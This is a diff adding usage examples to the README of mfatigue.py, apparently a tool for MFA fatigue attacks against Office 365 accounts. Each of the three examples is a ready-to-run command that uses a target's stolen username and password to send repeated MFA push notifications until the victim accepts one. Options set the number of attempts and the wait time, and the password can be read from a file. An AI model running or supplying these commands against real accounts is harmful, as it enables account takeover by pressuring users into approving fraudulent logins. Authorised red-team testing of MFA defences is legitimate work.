@@ -66,4 +66,20 @@ python3 ./mfatigue.py
   <br>
 </h2>
 
+**Example #1 : Basic usage with a known O365 username and password:**
+The following will attempt 3 x MFA push notifications (default), each with a 55 second (default) wait for user acceptance.
+```sh
+python3 ./mfatigue.py -u targetuser@randomtestdomain.com -p "P@ssword123"
+```
 
+**Example #2 : Alternatively, for a complex password, you can provide it as an input file (--single-pass-file):**
+Same as example #1 above, with the password read from the first line of the given text file.
+```sh
+python3 ./mfatigue.py -u targetuser@randomtestdomain.com -spf ./password.txt
+```
+
+**Example #3 : When required, you can specify additional parameters such as max mfa attempts and mfa wait period:** <br />
+In the example below we are attemping 10 x MFA push notificatons, each with a 30 second wait for user acceptance.
+```sh
+python3 ./mfatigue.py -u targetuser@randomtestdomain.com -spf ./password.txt -max-mfa 10 --max-mfa-wait 30
+```
